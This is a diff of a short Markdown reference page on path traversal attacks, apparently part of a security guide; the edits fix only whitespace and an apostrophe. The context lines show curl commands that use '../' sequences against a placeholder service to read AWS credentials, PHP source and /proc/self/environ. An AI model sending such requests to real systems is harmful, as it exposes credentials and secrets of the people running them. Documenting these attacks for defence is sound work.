@@ -1,6 +1,7 @@
 # Path Traversal
 
 ## Table of Contents
+
 - [Information Disclosure](#information-disclosure)
 - [Arbitrary File Modification](#arbitrary-file-modification)
 
@@ -17,7 +18,7 @@
     ```bash
     curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.aws/credentials
     ```
-  
+
 ### Sensitive information used in project can be exposed.
 
 - Hard-coded secret information exposure
@@ -30,7 +31,7 @@
     curl https://[VULNERABLE-SERVICE]/read?filename=../../../../var/www/html/index.php
     ```
 
-- Application’s environment variable information exposure
+- Application's environment variable information exposure
     - By reading the process environment:
         ```bash
         curl https://[VULNERABLE-SERVICE]/read?filename=../../../../proc/self/environ
